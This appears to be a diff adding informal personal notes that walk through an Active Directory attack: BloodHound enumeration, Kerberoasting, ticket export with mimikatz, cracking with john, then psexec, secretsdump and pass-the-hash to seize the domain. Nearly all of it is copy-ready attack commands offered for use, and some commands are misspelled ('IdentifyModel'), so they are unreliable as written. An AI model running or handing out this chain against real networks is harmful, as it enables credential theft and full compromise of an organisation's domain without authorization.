@@ -1,0 +1,119 @@
+1. post enumeration first step 
+
+checking users in systems
+
+net user /domain  
+
+now we check a users information
+
+net user <username-you-see> /domain
+
+now we put a sharphound on target system
+available in github 
+
+lput SharpHound.exe
+
+now we dump a sensitive information 
+
+SharpHound.exe
+
+all information availaible in bloodhound.zip
+
+lget bloodhound.zip
+
+type your kali terminal 
+
+neo4j console 
+
+now you see server is started to bloodhound 
+
+and upload a bloodhound.zip 
+wait for 100 % all file
+now you open a 3 dot/lines in uper corner 
+now you go a analyse
+now you see all post enumeration are available 
+
+
+2. karberosting & pass the hash
+
+firstly you login the who user to login starting 
+
+impacket-psexec `GROUPNAME/user:userpassword!@#@<targetIP>` powershell.exe
+
+enter this command esitize
+
+Add-Type -AssemblyName System.IdentifyModel 
+
+now you need a ticket of who admin system you hack lets see
+ 
+now you open a bloodhound and normally go a 3 dot/lines
+and go to the find at Domain admins 
+you see all the many user one user is admin 
+you understand automatically who user is admin or a full control
+click the user 
+and go node info in left side now you copy the service info name 
+
+now you enter the command 
+
+New-Object System.IdentifyModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<now you paste the server info name >"
+
+now you get a ticket see this good job but this
+ticket save on target computer hard drive 
+we need a hash and mimikatz is used for file to hash
+lets see
+
+copy this command ezitise
+
+lput mimikatz.exe
+lput mimilib.dll
+lput mimidrv.sys
+cd ..
+mimikatz.exe
+
+now we export the file hash
+
+copy this command 
+
+kerberos::list /export
+
+now you see all users ticket 
+
+now you search a admin user ticket 
+Saved to file : < copy this all >
+
+now you type command
+
+lget <paste this >
+
+now you save a ticket in kali machine 
+now we crack a ticket 
+with john
+
+copy command
+
+kirbi2john <paste file name> > hash
+
+john hash --wordlist=rockyou.txt
+
+now we have a domain user password 
+
+copy this command 
+
+impacket-psexec `GROUPNAME/adminusername:adminuserpass@<targetIP>`
+
+now we login the admin 
+and now type this command 
+
+impacket-secretsdump `GROUPNAME/adminusername:adminuserpass@<targetIP>`
+
+now we have all the group users hash and we also login with only hash
+this is pass the hash
+now how to login with only hash
+
+impacket-psexec `GROUPNAME/adminusername@<targetIP>` -hashes `<pasteuserhash>
+
+boom
+
+now you control the full active directory
+
+
